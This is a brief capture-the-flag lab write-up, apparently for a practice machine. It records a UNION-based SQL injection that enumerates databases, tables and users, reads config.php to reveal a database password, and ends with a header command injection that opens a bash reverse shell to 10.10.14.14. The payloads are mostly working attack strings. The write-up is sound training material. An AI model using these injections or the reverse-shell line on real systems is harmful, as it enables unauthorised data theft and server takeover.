7' UNION SELECT @@version--+
that working payload

that command to find databases:
7' UNION  SELECT group_concat(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA--+
result:
we found databases:
mysql,information_schema,performance_schema,sys,november

that command to find tables in november db:
7' UNION  SELECT group_concat(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='november'--+
result:
flag,players

that command to find name of column in players table in november db:
7' UNION  SELECT group_concat(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS where table_name='players'--+
result:
player
that command to find players:
7' UNION  SELECT group_concat(player) FROM november.players--+
result:
ippsec,celesian,big0us,luska,tinyboy

we also found flag UHC{F1rst_5tep_2_Qualify}
and past this into challenge.php that give for us access into ssh

we are uhc
all users:
debian-sys-maint,mysql.infoschema,mysql.session,mysql.sys,root,uhc


we found that we have privilege
' UNION SELECT  super_priv FROM mysql.user WHERE user="uhc"-- -

and this give for us read local files
7' UNION  SELECT LOAD_FILE('/var/www/html/config.php')--+
result
<?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>

after access we found file firewall.php in web root dir
![[Pasted image 20250209162709.png]]
we can abuse command injection
X-FORWARDED-FOR: ;bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1';